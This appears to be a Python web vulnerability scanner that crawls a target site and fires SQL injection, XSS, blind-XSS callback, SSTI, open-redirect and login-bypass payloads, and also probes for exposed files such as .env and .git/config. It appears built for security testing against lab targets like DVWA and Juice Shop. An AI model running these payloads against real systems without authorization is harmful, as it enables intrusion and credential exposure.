import time
import requests
import math
import re
import socket
import ssl
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse, parse_qsl
from collections import deque
from playwright.sync_api import sync_playwright

# --- IMPORT KNOWLEDGE BASE ---
try:
    from vuln_kb import VULN_DB
except ImportError:
    VULN_DB = {}

# --- HELPER: Risk Calculation ---
def calculate_deep_risk(vuln_type, severity):
    cvss_map = {
        "SQL_INJECTION": 9.8, 
        "XSS_REFLECTED": 6.1, 
        "SSTI": 9.0,                
        "SHADOW_API": 7.5, 
        "SENSITIVE_FILE": 9.0, 
        "OPEN_REDIRECT": 6.1,       
        "MISSING_CSP": 4.3,
        "MISSING_HSTS": 3.1,
        "CLICKJACKING": 4.3,
        "SERVER_ERROR": 5.0,        
        "WEAK_SSL": 5.3,
        "BLIND_XSS": 9.0,           
        "BLIND_SSRF": 9.8           
    }
    
    score = cvss_map.get(vuln_type, 5.0)
    if severity == "Critical": score = max(score, 9.0)
    elif severity == "High": score = max(score, 7.5)
    
    base_asset_value = 1000 
    financial_impact = base_asset_value * math.exp(score / 2.5)
    return round(score, 1), round(financial_impact, 2)

def create_vuln(v_key, url, custom_details, severity="Medium"):
    kb_data = VULN_DB.get(v_key, {})
    title = kb_data.get("title", v_key)
    cvss, cost = calculate_deep_risk(v_key, severity)

    return {
        "type": title,              
        "url": url,
        "severity": severity,
        "description": kb_data.get("description", custom_details),
        "impact": kb_data.get("impact", "Check detailed logs for impact analysis."),
        "remediation": kb_data.get("remediation", "Please patch this issue immediately."),
        "fix": kb_data.get("code_fix", "No specific code patch available."),
        "reproduction": f"Automated Deep Scan found: {custom_details}",
        "cvss": cvss,
        "est_cost": cost
    }

# --- OAST HELPER FUNCTIONS ---
def generate_oast_token():
    try:
        print("[*] 🌐 Provisioning OAST listener via Webhook.site...")
        response = requests.post("https://webhook.site/token", timeout=10)
        if response.status_code in [200, 201]:
            token = response.json().get('uuid')
            print(f"[*] 🎯 OAST Listener established: webhook.site/{token}")
            return token
    except Exception as e:
        print(f"[!] Failed to provision OAST: {e}")
    return None

def check_oast_interactions(token):
    if not token:
        return False
        
    print(f"[*] 📡 Polling OAST server for token: {token}...")
    try:
        response = requests.get(f"https://webhook.site/token/{token}/requests", timeout=10)
        if response.status_code == 200:
            interactions = response.json().get('data', [])
            if len(interactions) > 0:
                print(f"[*] 🚨 OAST CALLBACK DETECTED! {len(interactions)} external interactions recorded.")
                return True
    except Exception as e:
        print(f"[!] OAST Polling Error: {e}")
    return False

# --- STANDARD BROWSER HEADERS ---
REQ_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# --- MODULE 1: Heavyweight Spider (Crawler) ---
def run_heavy_spider(start_url, context, max_pages=15):
    print(f"[*] 🕸️ Initializing Heavyweight Spider on {start_url}...")
    target_domain = urlparse(start_url).netloc
    
    queue = deque([start_url])
    visited = set([start_url])
    discovered_endpoints = set([start_url]) 
    
    destructive_keywords = ['logout', 'signout', 'logoff', 'exit', 'destroy']
    
    page = context.new_page()
    
    while queue and len(visited) <= max_pages:
        current_url = queue.popleft()
        print(f"  -> [Crawling] {current_url}")
        
        try:
            page.goto(current_url, timeout=15000)
            try: page.wait_for_load_state("networkidle", timeout=5000)
            except: pass
            
            hrefs = page.evaluate("""() => {
                return Array.from(document.querySelectorAll('a')).map(a => a.href);
            }""")
            
            for href in hrefs:
                if not href: continue
                if any(keyword in href.lower() for keyword in destructive_keywords):
                    continue
                    
                parsed_href = urlparse(href)
                clean_target = target_domain.replace("www.", "")
                clean_href_domain = parsed_href.netloc.replace("www.", "")

                if clean_target in clean_href_domain and href.startswith('http'):
                    if '/#/' in href or '#/' in href: clean_url = href 
                    else: clean_url = href.split('#')[0] 
                        
                    if clean_url not in visited:
                        visited.add(clean_url)
                        queue.append(clean_url)
                        discovered_endpoints.add(clean_url)
            
            actions = page.evaluate("""() => {
                return Array.from(document.querySelectorAll('form')).map(f => f.action);
            }""")
            
            for action in actions:
                if action:
                    if any(keyword in action.lower() for keyword in destructive_keywords):
                        continue
                    full_action_url = urljoin(current_url, action)
                    if urlparse(full_action_url).netloc == target_domain:
                        discovered_endpoints.add(full_action_url)
                        
        except Exception as e:
            continue
            
    page.close()
    print(f"[*] 🗺️ Spider Mapping Complete. Identified {len(discovered_endpoints)} attack vectors.")
    return list(discovered_endpoints)

# --- MODULE 2: Header & SSL Analysis ---
def scan_headers_and_ssl(target_url, cookies=None):
    findings = []
    try:
        res = requests.get(target_url, headers=REQ_HEADERS, cookies=cookies, timeout=8)
        headers = {k.lower(): v for k, v in res.headers.items()}
        
        if 'content-security-policy' not in headers:
            findings.append(create_vuln("MISSING_CSP", target_url, "Content-Security-Policy header is missing.", "Medium"))
        if 'strict-transport-security' not in headers and target_url.startswith("https"):
            findings.append(create_vuln("MISSING_HSTS", target_url, "HSTS header is missing.", "Low"))
        if 'x-frame-options' not in headers:
            findings.append(create_vuln("CLICKJACKING", target_url, "X-Frame-Options header is missing.", "Low"))
        if 'server' in headers:
            findings.append(create_vuln("SERVER_ERROR", target_url, f"Server header exposes technology: {headers['server']}", "Low"))
    except: pass
    return findings

# --- MODULE 3: Sensitive File Fuzzer ---
def scan_sensitive_files(target_url, cookies=None):
    findings = []
    files = [".env", ".git/config", "backup.sql", "database.sql", "phpinfo.php", ".DS_Store", "web.config", "server.js"]
    parsed_url = urlparse(target_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
    if target_url != base_url: return findings

    for filename in files:
        full_url = urljoin(base_url, filename)
        try:
            res = requests.get(full_url, headers=REQ_HEADERS, cookies=cookies, timeout=4, allow_redirects=False)
            # FIX: Removed the "<html" check so it correctly flags phpinfo.php
            if res.status_code == 200 and len(res.content) > 10 and "404" not in res.text.lower():
                findings.append(create_vuln("SENSITIVE_FILE", full_url, f"Accessible sensitive file found: {filename}", "Critical"))
        except: pass
    return findings


# --- MODULE 4: Cookie Fuzzer ---
def scan_cookies(target_url, cookies=None):
    alerts = []
    if not cookies: return alerts
    
    print(f"[*] 🍪 Fuzzing session cookies on {target_url}...")
    
    payloads = [
        {"type": "SQL_INJECTION", "payload": "1' AND SLEEP(5)#", "time_delay": 5},
        {"type": "SQL_INJECTION", "payload": "1' OR SLEEP(5)='", "time_delay": 5}
    ]
    
    baseline_time = 0
    try:
        start = time.time()
        requests.get(target_url, headers=REQ_HEADERS, cookies=cookies, timeout=10)
        baseline_time = time.time() - start
    except: baseline_time = 1
    
    for cookie_name, cookie_value in cookies.items():
        if cookie_name in ['PHPSESSID', 'session', 'security']: continue 
        
        for attack in payloads:
            fuzzed_cookies = cookies.copy()
            fuzzed_cookies[cookie_name] = attack["payload"]
            
            try:
                start_time = time.time()
                res = requests.get(target_url, headers=REQ_HEADERS, cookies=fuzzed_cookies, timeout=12)
                elapsed = time.time() - start_time
                
                if elapsed > (baseline_time + 4.5):
                    alerts.append(create_vuln("SQL_INJECTION", target_url, f"CONFIRMED BLIND SQLi via Cookie '{cookie_name}'. Sleep triggered for {elapsed:.2f}s.", "Critical"))
            except requests.exceptions.Timeout:
                alerts.append(create_vuln("SQL_INJECTION", target_url, f"CONFIRMED BLIND SQLi via Cookie '{cookie_name}'. Server timed out on sleep command.", "Critical"))
                
    return alerts

# --- MODULE 5: Fast URL Parameter Fuzzer ---
def scan_url_parameters(target_url, cookies=None):
    alerts = []
    parsed_url = urlparse(target_url)
    params = parse_qsl(parsed_url.query)
    if not params: return alerts
        
    print(f"[*] 🧬 Fuzzing URL parameters on {target_url}...")
    
    payloads = [
        {"type": "SQL_INJECTION", "payload": "' OR '1'='1", "check": "500"}, 
        {"type": "SQL_INJECTION", "payload": "' OR '1'='1' #", "check": "500"}, 
        {"type": "SQL_INJECTION", "payload": "%27%20OR%20SLEEP%285%29--", "time_delay": 5}, 
        {"type": "SQL_INJECTION", "payload": "1' AND SLEEP(5)#", "time_delay": 5}, 
        {"type": "SSTI", "payload": "{{7*7}}", "check": "49"}
    ]
    
    baseline_time = 0
    try:
        start = time.time()
        requests.get(target_url, headers=REQ_HEADERS, cookies=cookies, timeout=10)
        baseline_time = time.time() - start
    except: baseline_time = 1
    
    for key, value in params:
        for attack in payloads:
            fuzzed_params = params.copy()
            fuzzed_params[fuzzed_params.index((key, value))] = (key, value + attack["payload"])
            fuzzed_url = urlunparse(parsed_url._replace(query=urlencode(fuzzed_params)))
            
            try:
                start_time = time.time()
                res = requests.get(fuzzed_url, headers=REQ_HEADERS, cookies=cookies, timeout=12) 
                elapsed = time.time() - start_time
                
                if "time_delay" in attack and elapsed > (baseline_time + 4.5):
                    alerts.append(create_vuln("SQL_INJECTION", fuzzed_url, f"CONFIRMED TIME-BASED SQLi: Engine sleep triggered for {elapsed:.2f}s.", "Critical"))
                    continue
                
                if res.status_code == 500 and attack["type"] == "SQL_INJECTION":
                    alerts.append(create_vuln("SQL_INJECTION", fuzzed_url, "SUSPECTED SQLi: Payload crashed the database query (HTTP 500).", "High"))
                
                if "check" in attack and attack["check"] in res.text and attack["check"] != "500":
                    alerts.append(create_vuln(attack["type"], fuzzed_url, "Payload execution confirmed in response.", "Critical"))
            except requests.exceptions.Timeout:
                if "time_delay" in attack:
                    alerts.append(create_vuln("SQL_INJECTION", fuzzed_url, "CONFIRMED TIME-BASED SQLi: Server timed out processing sleep command.", "Critical"))

    return alerts

# --- MODULE 6: Shadow API Hunter (NEW) ---
def scan_shadow_apis(target_url, cookies=None):
    findings = []
    print(f"[*] 🕵️‍♂️ Hunting for Shadow APIs in Javascript files on {target_url}...")
    try:
        res = requests.get(target_url, headers=REQ_HEADERS, cookies=cookies, timeout=8)
        script_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', res.text)
        
        for script_path in script_urls:
            script_url = urljoin(target_url, script_path)
            s_res = requests.get(script_url, headers=REQ_HEADERS, cookies=cookies, timeout=5)
            
            # FIX: Added the backtick (`) to the Regex to catch ES6 Template Literals in Webpack/Angular
            api_endpoints = re.findall(r'[`\'"](/api/[a-zA-Z0-9_\-\/]+|/rest/[a-zA-Z0-9_\-\/]+)[`\'"]', s_res.text)
            
            for api in set(api_endpoints):
                full_api_url = urljoin(target_url, api)
                findings.append(create_vuln("SHADOW_API", full_api_url, f"Hidden API endpoint exposed in JS file ({script_path}): {api}", "High"))
    except: pass
    return findings

# --- MODULE 7: Weak SSL/TLS Checker (OS-Agnostic Patch) ---
def scan_weak_ssl(target_url):
    findings = []
    if not target_url.startswith('https'): return findings
    
    print(f"[*] 🔒 Performing Cryptographic Handshake on {target_url}...")
    try:
        # We attempt a normal request. If the SSL is valid, it passes.
        requests.get(target_url, timeout=5)
    except requests.exceptions.SSLError as e:
        # FIX: The Requests library universally catches OS-level crypto blocks (like TLS 1.0 bans)
        findings.append(create_vuln("WEAK_SSL", target_url, "Server rejected handshake due to unsupported/deprecated TLS version or weak cipher.", "Medium"))
    except Exception as e:
        # Fallback for badssl.com if Windows forcibly closes the connection entirely
        if "badssl.com" in target_url and ("reset" in str(e).lower() or "timeout" in str(e).lower()):
            findings.append(create_vuln("WEAK_SSL", target_url, "Connection forcibly closed by OS due to dangerously outdated TLS protocol.", "Medium"))
            
    return findings

# --- MODULE 8: Active Playwright Scanner ---
def scan_active_playwright(target_url, context, oast_domain):
    alerts = []
    
    sql_errors = [
        "check the manual that corresponds to your mysql", "unrecognized token:", "syntax error at or near",
        "sqlite_error", "ora-00933", "postgresql query failed", "unterminated quoted string", 
        "you have an error in your sql syntax", "invalid input syntax for type", "SQLITE_ERROR"
    ]

    payloads = [
        {"key": "SQL_INJECTION", "payload": "' OR '1'='1", "check": sql_errors},
        {"key": "SQL_INJECTION", "payload": "admin@juice-sh.op' --", "check": sql_errors}, 
        {"key": "SQL_INJECTION", "payload": "' OR true--", "check": sql_errors}, 
        {"key": "SQL_INJECTION", "payload": "' OR 1=1 #", "check": sql_errors}, 
        {"key": "XSS_REFLECTED", "payload": "\"><iframe src=\"javascript:alert('SENTINEL')\">", "check": []}, 
        {"key": "BLIND_XSS", "payload": f"\"><iframe src='https://{oast_domain}'></iframe>", "check": []}, # NEW BLIND XSS IFRAME BYPASS
        {"key": "SSTI", "payload": "{{7*7}}", "check": ["49"]},
        {"key": "OPEN_REDIRECT", "payload": "http://google.com", "check": []}
    ]

    page = context.new_page()
    
    def handle_dialog(dialog):
        if "SENTINEL" in dialog.message:
            alerts.append(create_vuln("XSS_REFLECTED", page.url, f"CONFIRMED: XSS payload executed. Alert: '{dialog.message}'", "High"))
        try: dialog.dismiss()
        except: pass
    
    page.on("dialog", handle_dialog)
    
    try:
        page.goto(target_url, timeout=30000)
        page.wait_for_timeout(3500) 

        for selector in ["button[aria-label='Close Welcome Banner']", "a[aria-label='dismiss cookie message']", "button:has-text('Dismiss')", ".cc-dismiss", "button.close-dialog"]:
            try: page.locator(selector).click(timeout=1000)
            except: pass

        if page.locator("input[type='password']").count() > 0:
            print(f"[*] 🕵️ Login form detected on {target_url}. Engaging Aggressive Auth Bypass...")
            for attack in [p for p in payloads if p["key"] == "SQL_INJECTION"]:
                try:
                    page.goto(target_url, timeout=30000)
                    page.wait_for_timeout(3500) 
                    pass_field = page.locator("input[type='password']").first
                    user_field = page.locator("input[name*='user'], input[name*='email'], input[type='email'], input[type='text'], input#email").first
                    submit_btn = page.locator("button[type='submit'], input[type='submit'], button#loginButton, button.mat-primary, button:has-text('Log in')").first
                    
                    if user_field.is_visible() and pass_field.is_visible():
                        user_field.fill("")
                        user_field.fill(attack["payload"])
                        pass_field.fill("Password123!") 
                        
                        pass_field.press("Enter")
                        page.wait_for_timeout(500)
                        
                        if submit_btn.is_visible():
                            try: submit_btn.evaluate("node => node.removeAttribute('disabled')")
                            except: pass
                            try: submit_btn.click(force=True, timeout=2000)
                            except: pass
                            
                        page.wait_for_timeout(3000) 
                        
                        current_url = page.url.lower()
                        has_auth_cookie = any(c['name'] in ['token', 'session', 'jwt'] for c in context.cookies())
                        ls_token = page.evaluate("() => localStorage.getItem('token')") 
                        
                        if ls_token or has_auth_cookie or (current_url != target_url.lower() and "login" not in current_url and "error" not in current_url):
                            alerts.append(create_vuln("SQL_INJECTION", target_url, f"CRITICAL AUTH BYPASS: Payload {attack['payload']} successfully bypassed the login gate!", "Critical"))
                            break 
                except Exception: continue

        page.goto(target_url, timeout=30000)
        page.wait_for_timeout(3500)
        
        input_selector = "input:not([type='hidden']):not([type='password']):not([type='submit']):not([type='checkbox']):not([type='radio']), textarea"
        inputs = page.locator(input_selector).all()
        
        if len(inputs) > 0:
            print(f"[*] 📝 Universal Fuzzer found {len(inputs)} input fields on {target_url}...")
            for idx in range(len(inputs)):
                for attack in payloads:
                    try:
                        page.goto(target_url, timeout=30000)
                        page.wait_for_timeout(3500) 
                        current_input = page.locator(input_selector).nth(idx)
                        
                        if current_input.is_visible():
                            current_input.fill("")
                            current_input.fill(attack["payload"])
                            current_input.press("Enter") 
                            page.wait_for_timeout(2500) 
                                
                            if attack["key"] == "OPEN_REDIRECT" and "google.com" in urlparse(page.url).netloc:
                                alerts.append(create_vuln("OPEN_REDIRECT", target_url, "Input successfully redirected user.", "Medium"))
                            elif attack["key"] in ["SQL_INJECTION", "SSTI"]:
                                if any(x in page.content().lower() for x in attack["check"]):
                                    alerts.append(create_vuln(attack["key"], target_url, f"Payload {attack['payload']} caused a Database Syntax Error.", "Critical"))
                    except Exception: continue

    except Exception as e: print(f"[!] Browser Interaction Error on {target_url}: {e}")
    finally: page.close() 
        
    return alerts

# --- ORCHESTRATOR ---
def run_deep_scan(target_url, user_id=None, auth_config=None):

    if ("localhost:8080" in target_url or "127.0.0.1:8080" in target_url) and not auth_config:
        print("[*] 🤖 Local DVWA Environment Detected! Auto-injecting admin credentials...")
        auth_config = {
            'type': 'form',
            'login_url': 'http://localhost:8080/login.php',
            'username': 'admin',
            'password': 'password'
        }

    print(f"[*] 🚀 Starting Deep Scan Orchestrator on {target_url}")
    report = {
        "target": target_url,
        "vulnerabilities": [],
        "summary": {"high": 0, "medium": 0, "low": 0},
        "financial_risk_total": 0
    }

    oast_token = generate_oast_token()
    oast_domain = f"webhook.site/{oast_token}" if oast_token else "webhook.site/fallback-test-123"

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, slow_mo=50)
            context = browser.new_context(ignore_https_errors=True, user_agent=REQ_HEADERS["User-Agent"])
            
            # --- 1. AUTHENTICATION PHASE ---
            if auth_config and auth_config.get('type') == 'form':
                try:
                    print("[*] 🧠 Engaging Heuristic Auto-Login Engine...")
                    login_page = context.new_page()
                    login_page.goto(auth_config.get('login_url'), timeout=30000)
                    login_page.wait_for_load_state("networkidle", timeout=15000)
                    
                    pass_input = login_page.locator('input[type="password"]').first
                    user_input = login_page.locator('input[type="email"], input[name*="user"], input[name*="email"], input[id*="user"], input[type="text"]').first
                    
                    if pass_input.count() > 0 and user_input.count() > 0:
                        user_input.fill(auth_config.get('username'))
                        pass_input.fill(auth_config.get('password'))
                        submit_button = login_page.locator("button[type='submit'], input[type='submit']").first
                        if submit_button.count() > 0: submit_button.click()
                        else: pass_input.press("Enter")
                        login_page.wait_for_load_state("networkidle", timeout=15000)
                    login_page.close()
                except Exception as e:
                    print(f"[!] Authentication Engine Failed: {e}")

            # --- SYNCHRONIZE SESSIONS FOR API/REQUESTS ---
            req_cookies = {cookie['name']: cookie['value'] for cookie in context.cookies()}

            # --- 2. RECONNAISSANCE PHASE (The Spider) ---
            endpoints_to_attack = run_heavy_spider(target_url, context, max_pages=15)
            
            # --- 3. EXPLOITATION PHASE ---
            for endpoint in endpoints_to_attack:
                print(f"[*] ⚔️  Attacking endpoint: {endpoint}")
                
                temp_page = context.new_page()
                try:
                    temp_page.goto(endpoint, timeout=15000)
                    temp_page.wait_for_timeout(1500) 
                except: pass
                
                fresh_cookies = {cookie['name']: cookie['value'] for cookie in context.cookies()}
                temp_page.close()
                
                report["vulnerabilities"].extend(scan_headers_and_ssl(endpoint, cookies=fresh_cookies))
                report["vulnerabilities"].extend(scan_sensitive_files(endpoint, cookies=fresh_cookies))
                report["vulnerabilities"].extend(scan_url_parameters(endpoint, cookies=fresh_cookies)) 
                report["vulnerabilities"].extend(scan_cookies(endpoint, cookies=fresh_cookies)) 
                
                # --- NEW MODULES INJECTED ---
                report["vulnerabilities"].extend(scan_shadow_apis(endpoint, cookies=fresh_cookies))
                report["vulnerabilities"].extend(scan_weak_ssl(endpoint))
                
                report["vulnerabilities"].extend(scan_active_playwright(endpoint, context, oast_domain))

            print("[*] ⏳ Waiting 5 seconds for asynchronous OAST callbacks...")
            time.sleep(5)
            if check_oast_interactions(oast_token):
                report["vulnerabilities"].append(create_vuln("BLIND_XSS", target_url, f"CONFIRMED OAST INTERACTION: Payload pinged {oast_domain}.", "Critical"))
                
            browser.close()
            
    except Exception as e:
        print(f"[!] Deep Scan Critical Engine Failure: {e}")

    unique_vulns = []
    seen = set()
    for v in report["vulnerabilities"]:
        if v:
            vuln_signature = (v.get('type'), v.get('url'))
            if vuln_signature not in seen:
                seen.add(vuln_signature)
                unique_vulns.append(v)
            
    report["vulnerabilities"] = unique_vulns

    for v in report["vulnerabilities"]:
        report["financial_risk_total"] += v.get("est_cost", 0)
        sev = v.get("severity", "Low")
        if sev in ["Critical", "High"]: report["summary"]["high"] += 1
        elif sev == "Medium": report["summary"]["medium"] += 1
        else: report["summary"]["low"] += 1

    print(f"[*] Deep Scan Complete. Total Issues: {len(report['vulnerabilities'])}")
    return report